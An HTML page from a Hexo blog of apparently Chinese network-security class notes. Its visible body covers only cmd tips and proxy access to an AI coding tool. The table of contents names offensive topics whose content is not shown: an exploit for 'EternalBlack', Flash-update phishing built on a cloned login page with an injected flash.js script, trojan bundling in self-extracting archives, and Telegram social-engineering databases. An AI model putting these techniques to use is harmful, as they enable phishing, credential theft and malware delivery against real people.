@@ -1,0 +1,1035 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <title>网络安全笔记 | Hexo</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="网络安全笔记 | Hexo">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta property="og:type" content="website">
+<meta property="og:title" content="pageName">
+<meta property="og:url" content="http://example.com/pageName/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-07-10T10:20:34.000Z">
+<meta property="article:modified_time" content="2024-07-10T10:20:34.721Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/avatar.jpg"/>
+</a>
+<div class="author">
+    <span>John Doe</span>
+</div>
+
+<div class="icon">
+    
+        
+            <a title="rss"
+               href="/atom.xml"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-rss"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="github"
+               href="https://github.com/yelog"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="facebook"
+               href="https://www.facebook.com/faker.tops"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-facebook"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+    
+        
+            <a title="instagram"
+               href="https://www.facebook.com/faker.tops"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-instagram"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="reddit"
+               href="https://www.reddit.com/user/yelog/"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-reddit"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="weibo"
+               href="http://weibo.com/u/2307534817"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-weibo"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="jianshu"
+               href="https://www.jianshu.com/u/ff56736de7cf"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-jianshu"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="zhihu"
+               href="https://www.zhihu.com/people/jaytp/activities"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-zhihu"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+            <a title="oschina"
+               href="https://my.oschina.net/yelog"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-oschina"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+            <a title="email"
+               href="mailto:jaytp@qq.com"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-email"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="qq"
+               href="http://wpa.qq.com/msgrd?v=3&uin=872336115&site=qq&menu=yes"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-qq"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="kugou"
+               href="https://www.kugou.com/"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-kugou"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="neteasemusic"
+               href="https://music.163.com/#/user/home?id=88151013"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-neteasemusic"></use>
+                    </svg>
+                
+            </a>
+        
+    
+</div>
+
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="All">All
+            
+                <small>(4)</small>
+            
+        </div>
+    </li>
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+            
+    </div>
+    <div>
+        
+            <a class="about  hasFriend  site_url"
+               
+               href="/about">About</a>
+        
+        <a style="width: 50%"
+                
+                                           class="friends">Friends</a>
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="4">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        Links
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="search shortcut key i"></i>
+            <div class="right-title">All</div>
+            <i class="iconfont icon-file-tree" data-title="switch to outline view shortcut key w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="return"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="case sensitive"></i>
+            <i class="iconfont icon-tag" data-title="label"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">outline</div>
+            <i class="iconfont icon-list" data-title="switch to article list"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+    </div>
+
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        
+        <a  class="All "
+           href="/2024/07/11/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="网络安全笔记">网络安全笔记</span>
+            <span class="post-date" title="2024-07-11 20:03:59">2024/07/11</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/07/10/lyr/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="lyr">lyr</span>
+            <span class="post-date" title="2024-07-10 18:08:57">2024/07/10</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/07/10/hello-world/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Hello World">Hello World</span>
+            <span class="post-date" title="2024-07-10 16:50:39">2024/07/10</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/07/10/test-my-site/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="test_my_site">test_my_site</span>
+            <span class="post-date" title="2024-07-10 15:30:30">2024/07/10</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="Toggle full screen shortcut key s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-网络安全笔记" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">网络安全笔记</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2024-07-11 20:05:06'>2024-07-11 20:03</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            Views 👀 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81cmd%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-text">1、cmd的注意事项</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81ai%E7%9A%84codeium%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">2、ai的codeium的使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E8%BD%AF%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E6%96%B9%E6%B3%95%E8%A1%A5%E5%85%85"><span class="toc-text">3、软件下载的方法补充</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">4、虚拟机的使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E9%87%8D%E8%A3%85%E7%B3%BB%E7%BB%9F"><span class="toc-text">5、重装系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E4%BB%A3%E7%90%86%E7%9A%84%E8%B4%AD%E4%B9%B0%E4%B8%8E%E5%BA%94%E7%94%A8"><span class="toc-text">6 代理的购买与应用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E5%B7%A5%E4%BD%9C%E9%9C%80%E6%B1%82"><span class="toc-text">1、工作需求</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8%E3%80%81%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E8%93%9D%E5%B1%8F"><span class="toc-text">8、永恒之黑蓝屏</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81poc%EF%BC%88%E8%93%9D%E5%B1%8F%EF%BC%89%EF%BC%89%EF%BC%88%E8%A7%82%E7%82%B9%E9%AA%8C%E8%AF%81%E8%84%9A%E6%9C%AC%EF%BC%89"><span class="toc-text">1、poc（蓝屏））（观点验证脚本）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81exp-rec"><span class="toc-text">2、exp(rec)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9%E3%80%81%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%9A%84%E8%AE%B2%E8%A7%A3"><span class="toc-text">9、计算机网络的讲解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E7%94%B5%E8%84%91IP%E8%AE%B2%E8%A7%A3"><span class="toc-text">1、电脑IP讲解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E6%89%AB%E6%8F%8Fip%E5%9C%B0%E5%9D%80"><span class="toc-text">2、扫描ip地址</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#10%E3%80%81%E5%88%A9%E7%94%A8github%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2"><span class="toc-text">10、利用github搭建hexo博客</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text"></span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1%E3%80%81%E5%87%86%E5%A4%87%E5%89%8D%E6%8F%90"><span class="toc-text">1、准备前提</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2%E3%80%81%E6%93%8D%E4%BD%9C%E6%AD%A5%E9%AA%A4"><span class="toc-text">2、操作步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#11%E3%80%81%E5%88%A9%E7%94%A8%E8%AF%AD%E9%9B%80%E5%9C%A8%E5%8D%9A%E5%AE%A2%E4%B8%8A-%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%B9%E4%BE%BF"><span class="toc-text">11、利用语雀在博客上 上传图片方便</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E8%AF%AD%E9%9B%80%E4%B8%8A%E7%9A%84%E6%93%8D%E4%BD%9C"><span class="toc-text">1、语雀上的操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E4%BB%A5%E4%B8%8B%E4%B8%BA%E4%BB%A3%E7%A0%81%E8%BF%9B%E5%85%A5%E7%BC%96%E8%BE%91%E5%8D%B3%E5%8F%AF%E5%A4%8D%E5%88%B6%E5%88%B0%E4%BB%A3%E7%A0%81%E9%87%8C%E9%9D%A2%E5%9B%BE%E7%89%87%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%8A%A0%E8%BD%BD%E4%BA%86%E3%80%82"><span class="toc-text">2、以下为代码进入编辑即可复制到代码里面图片就可以加载了。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12%E3%80%81falsh%E9%92%93%E9%B1%BC"><span class="toc-text">12、falsh钓鱼</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E5%87%86%E5%A4%87%E4%B8%80%E4%B8%AAflash%E5%BC%B9%E7%AA%97%E7%9A%84js%E6%96%87%E4%BB%B6"><span class="toc-text">1、准备一个flash弹窗的js文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E4%BF%AE%E6%94%B9js%E6%96%87%E4%BB%B6%E4%B8%AD%EF%BC%8C%E7%AB%8B%E5%8D%B3%E5%8D%87%E7%BA%A7%E7%9A%84%E4%BA%8B%E4%BB%B6"><span class="toc-text">2、修改js文件中，立即升级的事件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E5%87%86%E5%A4%87%E4%B8%80%E4%B8%AA%E9%AB%98%E4%BB%BF%E9%A1%B5%E9%9D%A2%E8%BF%99%E9%87%8C%E6%88%91%E7%94%A8%E4%B8%80%E4%B8%AA%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2%E4%BD%9C%E4%B8%BA%E4%BE%8B%E5%AD%90"><span class="toc-text">3、准备一个高仿页面这里我用一个登录页面作为例子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81%E5%9C%A8%E9%A1%B5%E9%9D%A2%E4%B8%AD%E6%8F%92%E5%85%A5%E6%88%91%E4%BB%AC%E7%9A%84js%E9%93%BE%E6%8E%A5%E6%8F%92%E5%85%A5%E5%9C%A8login-php-%E4%BB%A5%E5%90%8E%E5%9F%BA%E6%9C%AC%E9%83%BD%E7%94%A8php%E5%90%8E%E7%BC%80%E6%9D%A5%E4%B8%8A%E8%AF%BE%E4%BD%BF%E7%94%A8-html%E8%87%AA%E8%A1%8C%E7%A0%94%E7%A9%B6"><span class="toc-text">4、在页面中插入我们的js链接&lt;script src&#x3D;&quot;flash.js&quot;&gt;&lt;&#x2F;script&gt;插入在login.php(以后基本都用php后缀来上课使用    (html自行研究))</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#-1"><span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E3%80%81%E5%B0%9D%E8%AF%95%E8%AE%BF%E9%97%AE"><span class="toc-text">5、尝试访问</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13%E3%80%81-%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%8D%86%E7%BB%91%E6%9C%A8%E9%A9%AC"><span class="toc-text">13、 自解压捆绑木马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%8D%86%E7%BB%91%E6%9C%A8%E9%A9%AC"><span class="toc-text">1、自解压捆绑木马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#14%E3%80%81%E8%99%9A%E6%8B%9F%E8%B4%A6%E5%8F%B7%E7%9A%84%E8%B4%AD%E4%B9%B0telegram"><span class="toc-text">14、虚拟账号的购买telegram</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81TG%E7%A4%BE%E5%B7%A5%E5%BA%93"><span class="toc-text">1、TG社工库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81tg%E6%B3%A8%E5%86%8C-2023-11-27"><span class="toc-text">2、tg注册(2023&#x2F;11&#x2F;27)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E6%96%B9%E6%B3%951%EF%BC%88%E5%BB%BA%E8%AE%AE%E8%BF%99%E4%B8%AA%EF%BC%89"><span class="toc-text">1、方法1（建议这个）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E6%96%B9%E6%B3%952-%E9%AB%98%E6%88%90%E5%8A%9F%E7%8E%87"><span class="toc-text">2、方法2(高成功率)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81cmd%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-1"><span class="toc-text">1、cmd的注意事项</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81ai%E7%9A%84codeium%E7%9A%84%E4%BD%BF%E7%94%A8-1"><span class="toc-text">2、ai的codeium的使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E8%BD%AF%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E6%96%B9%E6%B3%95%E8%A1%A5%E5%85%85-1"><span class="toc-text">3、软件下载的方法补充</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E4%BD%BF%E7%94%A8-1"><span class="toc-text">4、虚拟机的使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E9%87%8D%E8%A3%85%E7%B3%BB%E7%BB%9F-1"><span class="toc-text">5、重装系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E4%BB%A3%E7%90%86%E7%9A%84%E8%B4%AD%E4%B9%B0%E4%B8%8E%E5%BA%94%E7%94%A8-1"><span class="toc-text">6 代理的购买与应用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E5%B7%A5%E4%BD%9C%E9%9C%80%E6%B1%82-1"><span class="toc-text">1、工作需求</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8%E3%80%81%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E8%93%9D%E5%B1%8F-1"><span class="toc-text">8、永恒之黑蓝屏</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81poc%EF%BC%88%E8%93%9D%E5%B1%8F%EF%BC%89%EF%BC%89%EF%BC%88%E8%A7%82%E7%82%B9%E9%AA%8C%E8%AF%81%E8%84%9A%E6%9C%AC%EF%BC%89-1"><span class="toc-text">1、poc（蓝屏））（观点验证脚本）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81exp-rec-1"><span class="toc-text">2、exp(rec)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9%E3%80%81%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%9A%84%E8%AE%B2%E8%A7%A3-1"><span class="toc-text">9、计算机网络的讲解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E7%94%B5%E8%84%91IP%E8%AE%B2%E8%A7%A3-1"><span class="toc-text">1、电脑IP讲解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E6%89%AB%E6%8F%8Fip%E5%9C%B0%E5%9D%80-1"><span class="toc-text">2、扫描ip地址</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#10%E3%80%81%E5%88%A9%E7%94%A8github%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2-1"><span class="toc-text">10、利用github搭建hexo博客</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#-2"><span class="toc-text"></span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1%E3%80%81%E5%87%86%E5%A4%87%E5%89%8D%E6%8F%90-1"><span class="toc-text">1、准备前提</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2%E3%80%81%E6%93%8D%E4%BD%9C%E6%AD%A5%E9%AA%A4-1"><span class="toc-text">2、操作步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#11%E3%80%81%E5%88%A9%E7%94%A8%E8%AF%AD%E9%9B%80%E5%9C%A8%E5%8D%9A%E5%AE%A2%E4%B8%8A-%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%B9%E4%BE%BF-1"><span class="toc-text">11、利用语雀在博客上 上传图片方便</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E8%AF%AD%E9%9B%80%E4%B8%8A%E7%9A%84%E6%93%8D%E4%BD%9C-1"><span class="toc-text">1、语雀上的操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E4%BB%A5%E4%B8%8B%E4%B8%BA%E4%BB%A3%E7%A0%81%E8%BF%9B%E5%85%A5%E7%BC%96%E8%BE%91%E5%8D%B3%E5%8F%AF%E5%A4%8D%E5%88%B6%E5%88%B0%E4%BB%A3%E7%A0%81%E9%87%8C%E9%9D%A2%E5%9B%BE%E7%89%87%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%8A%A0%E8%BD%BD%E4%BA%86%E3%80%82-1"><span class="toc-text">2、以下为代码进入编辑即可复制到代码里面图片就可以加载了。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12%E3%80%81falsh%E9%92%93%E9%B1%BC-1"><span class="toc-text">12、falsh钓鱼</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E5%87%86%E5%A4%87%E4%B8%80%E4%B8%AAflash%E5%BC%B9%E7%AA%97%E7%9A%84js%E6%96%87%E4%BB%B6-1"><span class="toc-text">1、准备一个flash弹窗的js文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E4%BF%AE%E6%94%B9js%E6%96%87%E4%BB%B6%E4%B8%AD%EF%BC%8C%E7%AB%8B%E5%8D%B3%E5%8D%87%E7%BA%A7%E7%9A%84%E4%BA%8B%E4%BB%B6-1"><span class="toc-text">2、修改js文件中，立即升级的事件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E5%87%86%E5%A4%87%E4%B8%80%E4%B8%AA%E9%AB%98%E4%BB%BF%E9%A1%B5%E9%9D%A2%E8%BF%99%E9%87%8C%E6%88%91%E7%94%A8%E4%B8%80%E4%B8%AA%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2%E4%BD%9C%E4%B8%BA%E4%BE%8B%E5%AD%90-1"><span class="toc-text">3、准备一个高仿页面这里我用一个登录页面作为例子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81%E5%9C%A8%E9%A1%B5%E9%9D%A2%E4%B8%AD%E6%8F%92%E5%85%A5%E6%88%91%E4%BB%AC%E7%9A%84js%E9%93%BE%E6%8E%A5%E6%8F%92%E5%85%A5%E5%9C%A8login-php-%E4%BB%A5%E5%90%8E%E5%9F%BA%E6%9C%AC%E9%83%BD%E7%94%A8php%E5%90%8E%E7%BC%80%E6%9D%A5%E4%B8%8A%E8%AF%BE%E4%BD%BF%E7%94%A8-html%E8%87%AA%E8%A1%8C%E7%A0%94%E7%A9%B6-1"><span class="toc-text">4、在页面中插入我们的js链接&lt;script src&#x3D;&quot;flash.js&quot;&gt;&lt;&#x2F;script&gt;插入在login.php(以后基本都用php后缀来上课使用    (html自行研究))</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#-3"><span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E3%80%81%E5%B0%9D%E8%AF%95%E8%AE%BF%E9%97%AE-1"><span class="toc-text">5、尝试访问</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13%E3%80%81-%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%8D%86%E7%BB%91%E6%9C%A8%E9%A9%AC-1"><span class="toc-text">13、 自解压捆绑木马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%8D%86%E7%BB%91%E6%9C%A8%E9%A9%AC-1"><span class="toc-text">1、自解压捆绑木马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#14%E3%80%81%E8%99%9A%E6%8B%9F%E8%B4%A6%E5%8F%B7%E7%9A%84%E8%B4%AD%E4%B9%B0telegram-1"><span class="toc-text">14、虚拟账号的购买telegram</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81TG%E7%A4%BE%E5%B7%A5%E5%BA%93-1"><span class="toc-text">1、TG社工库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81tg%E6%B3%A8%E5%86%8C-2023-11-27-1"><span class="toc-text">2、tg注册(2023&#x2F;11&#x2F;27)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E6%96%B9%E6%B3%951%EF%BC%88%E5%BB%BA%E8%AE%AE%E8%BF%99%E4%B8%AA%EF%BC%89-1"><span class="toc-text">1、方法1（建议这个）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E6%96%B9%E6%B3%952-%E9%AB%98%E6%88%90%E5%8A%9F%E7%8E%87-1"><span class="toc-text">2、方法2(高成功率)</span></a></li></ol></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><a name="JeWxV"></a></p>
+<h2 id="1、cmd的注意事项"><a href="#1、cmd的注意事项" class="headerlink" title="1、cmd的注意事项"></a>1、cmd的注意事项</h2><p>在这里就用cmd时用窗口可直接使用如图下图就不用从win加r里敲这个路径了<br />在这里就用cmd时用窗口可直接使用如图下图就不用从win加r里敲这个路径了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608406562-a2ede100-dcee-404a-bffe-dedaa03d1920.png#averageHue=%23f1f1f1&id=Rb0kz&originHeight=83&originWidth=803&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608406797-cce7db1b-0518-4c9d-b32f-5e08254d0e0b.png#averageHue=%231d1d1d&id=cDLAf&originHeight=104&originWidth=603&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p><a name="YcXMp"></a></p>
+<h2 id="2、ai的codeium的使用"><a href="#2、ai的codeium的使用" class="headerlink" title="2、ai的codeium的使用"></a>2、ai的codeium的使用</h2><p>在使用ai的时候需要打开这个软件用edge使用扩展来连老师的IP地址然后使用老师的原理是老师花钱买的一个可以来链接到国外的ip通过老师这个节点我们来使用al<br />如下图<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608406999-afc08612-a024-4786-969c-333fc32a33cd.png#averageHue=%2321201f&id=uF7NF&originHeight=182&originWidth=391&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608407148-4eee74c4-ece2-4e0d-ba8b-57d53690629e.png#averageHue=%23f5f5f5&id=OfZaZ&originHeight=139&originWidth=1324&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608407349-bd005ad6-7f2c-4a29-9ae1-8d0375745650.png#averageHue=%23f6f6f6&id=aNdAK&originHeight=92&originWidth=513&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="VKOqj"></a></p>
